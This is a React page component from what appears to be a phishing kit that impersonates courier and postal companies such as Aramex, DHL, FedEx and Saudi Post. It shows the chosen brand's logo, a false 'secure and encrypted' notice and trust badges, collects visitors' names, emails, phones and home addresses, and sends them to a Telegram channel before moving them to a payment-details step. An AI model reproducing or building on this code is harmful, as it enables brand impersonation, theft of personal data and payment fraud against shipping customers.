import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBrandingByCompany } from "@/lib/brandingSystem";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin, Lock } from "lucide-react";
import heroAramex from "@/assets/hero-aramex.jpg";
import heroDhl from "@/assets/hero-dhl.jpg";
import heroFedex from "@/assets/hero-fedex.jpg";
import heroSmsa from "@/assets/hero-smsa.jpg";
import heroUps from "@/assets/hero-ups.jpg";
import heroEmpost from "@/assets/hero-empost.jpg";
import heroZajil from "@/assets/hero-zajil.jpg";
import heroNaqel from "@/assets/hero-naqel.jpg";
import heroSaudipost from "@/assets/hero-saudipost.jpg";
import heroKwpost from "@/assets/hero-kwpost.jpg";
import heroQpost from "@/assets/hero-qpost.jpg";
import heroOmanpost from "@/assets/hero-omanpost.jpg";
import heroBahpost from "@/assets/hero-bahpost.jpg";
import heroGenacom from "@/assets/hero-genacom.jpg";
import heroAlbaraka from "@/assets/hero-albaraka.jpg";
import heroAlfuttaim from "@/assets/hero-alfuttaim.jpg";
import heroAlshaya from "@/assets/hero-alshaya.jpg";
import heroBahri from "@/assets/hero-bahri.jpg";
import heroShipco from "@/assets/hero-shipco.jpg";
import heroHellmann from "@/assets/hero-hellmann.jpg";
import heroDsv from "@/assets/hero-dsv.jpg";
import heroJinakum from "@/assets/hero-jinakum.jpg";
import heroBg from "@/assets/hero-bg.jpg";

const PaymentRecipient = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const currencyParam = urlParams.get('currency');
  const titleParam = urlParams.get('title');

  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const enhancedBranding = getBrandingByCompany(serviceKey);
  const companyMeta = getCompanyMeta(serviceKey);

  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
  const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
  const dynamicImage = companyMeta.image;

  const shippingInfo = linkData?.payload as any;
  const payerType = shippingInfo?.payer_type || "recipient";
  const countryCode = shippingInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";
  const currencyCode = currencyParam || countryData?.currency || "SAR";

  const rawAmount = shippingInfo?.cod_amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, currencyCode);
  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
  
  const heroImages: Record<string, string> = {
    'aramex': heroAramex,
    'dhl': heroDhl,
    'dhlkw': heroDhl,
    'dhlqa': heroDhl,
    'dhlom': heroDhl,
    'dhlbh': heroDhl,
    'fedex': heroFedex,
    'smsa': heroSmsa,
    'ups': heroUps,
    'empost': heroEmpost,
    'zajil': heroZajil,
    'naqel': heroNaqel,
    'saudipost': heroSaudipost,
    'kwpost': heroKwpost,
    'qpost': heroQpost,
    'omanpost': heroOmanpost,
    'bahpost': heroBahpost,
    'genacom': heroGenacom,
    'jinaken': heroGenacom,
    'albaraka': heroAlbaraka,
    'alfuttaim': heroAlfuttaim,
    'alshaya': heroAlshaya,
    'bahri': heroBahri,
    'national': heroBahri,
    'shipco': heroShipco,
    'hellmann': heroHellmann,
    'dsv': heroDsv,
    'jinakum': heroJinakum,
  };
  
  const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;
  
  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!linkData) return;

    const formData = new FormData();
    formData.append('form-name', 'payment-recipient');
    formData.append('name', customerName);
    formData.append('email', customerEmail);
    formData.append('phone', customerPhone);
    formData.append('address', residentialAddress);
    formData.append('service', serviceName);
    formData.append('amount', formattedAmount);
    formData.append('linkId', id || '');

    try {
      await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(formData as any).toString()
      });
    } catch (error) {
      console.error('Form submission error:', error);
    }

    const productionDomain = window.location.origin;
    const telegramResult = await sendToTelegram({
      type: 'payment_recipient',
      data: {
        name: customerName,
        email: customerEmail,
        phone: customerPhone,
        address: residentialAddress,
        service: serviceName,
        amount: formattedAmount,
        payment_url: `${productionDomain}/pay/${id}/details`
      },
      timestamp: new Date().toISOString()
    });

    try {
      const customerData = {
        ...linkData.payload,
        customerInfo: {
          name: customerName,
          email: customerEmail,
          phone: customerPhone,
          address: residentialAddress,
          service: serviceName,
          amount: formattedAmount
        },
        selectedCountry: countryCode
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: customerData
      });
    } catch (error) {
      // Silent error handling
    }

    navigate(`/pay/${id}/details`);
  };
  
  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formattedAmount}
        title={dynamicTitle}
        description={dynamicDescription}
      />
      <Helmet>
        <meta property="og:image" content={dynamicImage} />
        <meta name="twitter:image" content={dynamicImage} />
      </Helmet>
      <div 
        className="min-h-screen" 
        dir="rtl"
        style={{
          background: enhancedBranding?.colors.background || '#FFFFFF',
          fontFamily: enhancedBranding?.fonts.arabic || 'Almarai, sans-serif'
        }}
      >
        {/* Hero Section - Compact & Responsive */}
        <div className="relative w-full h-28 sm:h-36 md:h-44 overflow-hidden">
          <img 
            src={heroImage}
            alt={serviceName}
            className="w-full h-full object-cover"
          />
          <div className="absolute inset-0" style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}CC, ${branding.colors.primary}99)`
          }} />
          
          {/* Company Logo - Top Left */}
          <div className="absolute top-2 left-2 sm:top-3 sm:left-4">
            {branding.logo && (
              <div className="bg-white/95 backdrop-blur-sm rounded-lg p-1.5 sm:p-2 shadow-xl" style={{
                border: `2px solid ${branding.colors.primary}20`
              }}>
                <img 
                  src={branding.logo} 
                  alt={serviceName}
                  className="h-6 sm:h-8 md:h-10 w-auto"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              </div>
            )}
          </div>
          
          {/* Service Name & Badge - Bottom Right */}
          <div className="absolute bottom-2 right-2 sm:bottom-3 sm:right-4 text-white">
            <div className="text-right space-y-1">
              <h2 className="text-sm sm:text-base md:text-lg font-bold tracking-wide">{serviceName}</h2>
              <div className="flex items-center gap-1.5 justify-end">
                <Lock className="w-3 h-3 sm:w-3.5 sm:h-3.5" />
                <span className="text-[10px] sm:text-xs opacity-95">دفع آمن ومشفر</span>
              </div>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-2 sm:px-3 md:px-4 -mt-5 sm:-mt-7 md:-mt-8 relative z-10 pb-6">
          <div className="max-w-lg mx-auto">
            
            <Card className="p-3 sm:p-4 md:p-5 shadow-2xl backdrop-blur-sm" style={{ 
              borderTop: `3px solid ${branding.colors.primary}`,
              background: enhancedBranding?.colors.surface || '#FFFFFF',
              boxShadow: `0 20px 50px ${branding.colors.primary}20`,
              borderRadius: '12px'
            }}>
              <form onSubmit={handleProceed}>
                {/* Header Section */}
                <div className="flex items-center justify-between mb-4 sm:mb-5 pb-3 border-b" style={{
                  borderColor: `${branding.colors.primary}20`
                }}>
                  <div>
                    <h1 className="text-base sm:text-lg md:text-xl font-bold" style={{
                      color: enhancedBranding?.colors.text || '#1A1A1A'
                    }}>
                      {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
                    </h1>
                    <p className="text-[10px] sm:text-xs mt-0.5" style={{
                      color: enhancedBranding?.colors.textLight || '#6E6E6E'
                    }}>
                      أدخل بياناتك لإكمال عملية الدفع
                    </p>
                  </div>
                  
                  <div
                    className="w-10 h-10 sm:w-11 sm:h-11 md:w-12 md:h-12 rounded-xl flex items-center justify-center shadow-md"
                    style={{
                      background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary || branding.colors.primary})`,
                    }}
                  >
                    <CreditCard className="w-5 h-5 sm:w-5.5 sm:h-5.5 md:w-6 md:h-6 text-white" />
                  </div>
                </div>

                {/* Amount Badge */}
                <div className="mb-4 p-2.5 rounded-lg" style={{
                  background: `linear-gradient(135deg, ${branding.colors.primary}12, ${branding.colors.secondary || branding.colors.primary}08)`,
                  border: `1px solid ${branding.colors.primary}30`
                }}>
                  <div className="flex items-center justify-between">
                    <span className="text-xs sm:text-sm" style={{ color: enhancedBranding?.colors.textLight }}>
                      المبلغ المطلوب
                    </span>
                    <span className="text-base sm:text-lg md:text-xl font-bold" style={{ 
                      color: branding.colors.primary 
                    }}>
                      {formattedAmount}
                    </span>
                  </div>
                </div>

                {/* Form Fields - Compact & Clean */}
                <div className="space-y-2.5 sm:space-y-3 mb-4 sm:mb-5">
                  {/* Name Field */}
                  <div>
                    <Label htmlFor="name" className="flex items-center gap-1 mb-1.5 text-[11px] sm:text-xs font-semibold" style={{
                      color: enhancedBranding?.colors.text
                    }}>
                      <User className="w-3 h-3" style={{ color: branding.colors.primary }} />
                      الاسم الكامل
                    </Label>
                    <Input
                      id="name"
                      value={customerName}
                      onChange={(e) => setCustomerName(e.target.value)}
                      required
                      className="h-9 sm:h-10 text-xs sm:text-sm transition-all"
                      placeholder="أدخل اسمك الكامل"
                      style={{
                        borderColor: `${branding.colors.primary}40`,
                        fontFamily: enhancedBranding?.fonts.arabic
                      }}
                    />
                  </div>
                  
                  {/* Email Field */}
                  <div>
                    <Label htmlFor="email" className="flex items-center gap-1 mb-1.5 text-[11px] sm:text-xs font-semibold" style={{
                      color: enhancedBranding?.colors.text
                    }}>
                      <Mail className="w-3 h-3" style={{ color: branding.colors.primary }} />
                      البريد الإلكتروني
                    </Label>
                    <Input
                      id="email"
                      type="email"
                      value={customerEmail}
                      onChange={(e) => setCustomerEmail(e.target.value)}
                      required
                      className="h-9 sm:h-10 text-xs sm:text-sm transition-all"
                      placeholder="example@email.com"
                      dir="ltr"
                      style={{
                        borderColor: `${branding.colors.primary}40`
                      }}
                    />
                  </div>
                  
                  {/* Phone Field */}
                  <div>
                    <Label htmlFor="phone" className="flex items-center gap-1 mb-1.5 text-[11px] sm:text-xs font-semibold" style={{
                      color: enhancedBranding?.colors.text
                    }}>
                      <Phone className="w-3 h-3" style={{ color: branding.colors.primary }} />
                      رقم الهاتف
                    </Label>
                    <Input
                      id="phone"
                      type="tel"
                      value={customerPhone}
                      onChange={(e) => setCustomerPhone(e.target.value)}
                      required
                      className="h-9 sm:h-10 text-xs sm:text-sm transition-all"
                      placeholder={`${phoneCode} ${phonePlaceholder}`}
                      dir="ltr"
                      style={{
                        borderColor: `${branding.colors.primary}40`
                      }}
                    />
                  </div>
                  
                  {/* Address Field */}
                  <div>
                    <Label htmlFor="address" className="flex items-center gap-1 mb-1.5 text-[11px] sm:text-xs font-semibold" style={{
                      color: enhancedBranding?.colors.text
                    }}>
                      <MapPin className="w-3 h-3" style={{ color: branding.colors.primary }} />
                      العنوان السكني
                    </Label>
                    <Input
                      id="address"
                      value={residentialAddress}
                      onChange={(e) => setResidentialAddress(e.target.value)}
                      required
                      className="h-9 sm:h-10 text-xs sm:text-sm transition-all"
                      placeholder="أدخل عنوانك السكني الكامل"
                      style={{
                        borderColor: `${branding.colors.primary}40`,
                        fontFamily: enhancedBranding?.fonts.arabic
                      }}
                    />
                  </div>
                </div>

                {/* Security Notice */}
                <div className="mb-4 p-2 rounded-lg flex items-center gap-2" style={{
                  background: `${branding.colors.primary}08`,
                  border: `1px solid ${branding.colors.primary}20`
                }}>
                  <Shield className="w-3.5 h-3.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
                  <p className="text-[10px] sm:text-xs" style={{ color: enhancedBranding?.colors.textLight }}>
                    معلوماتك محمية بأعلى معايير الأمان والتشفير
                  </p>
                </div>
              
                {/* Submit Button */}
                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-xs sm:text-sm py-4 sm:py-4.5 text-white font-bold transition-all hover:shadow-lg"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary || branding.colors.primary})`,
                    fontFamily: enhancedBranding?.fonts.arabic
                  }}
                >
                  <span className="ml-2">التالي - إكمال الدفع</span>
                  <ArrowLeft className="w-3.5 h-3.5 sm:w-4 sm:h-4 mr-2" />
                </Button>
              
                <p className="text-[9px] sm:text-[10px] text-center mt-3" style={{ 
                  color: enhancedBranding?.colors.textLight 
                }}>
                  بالمتابعة، أنت توافق على الشروط والأحكام
                </p>
              </form>
              
              {/* Hidden Netlify Form */}
              <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
                <input type="text" name="name" />
                <input type="email" name="email" />
                <input type="tel" name="phone" />
                <input type="text" name="address" />
                <input type="text" name="service" />
                <input type="text" name="amount" />
                <input type="text" name="linkId" />
              </form>
            </Card>

            {/* Footer Trust Badges */}
            <div className="mt-4 flex items-center justify-center gap-4 opacity-60">
              <div className="flex items-center gap-1.5">
                <Shield className="w-3.5 h-3.5" style={{ color: branding.colors.primary }} />
                <span className="text-[10px]" style={{ color: enhancedBranding?.colors.textLight }}>
                  SSL آمن
                </span>
              </div>
              <div className="flex items-center gap-1.5">
                <Lock className="w-3.5 h-3.5" style={{ color: branding.colors.primary }} />
                <span className="text-[10px]" style={{ color: enhancedBranding?.colors.textLight }}>
                  مشفر 256-bit
                </span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentRecipient;
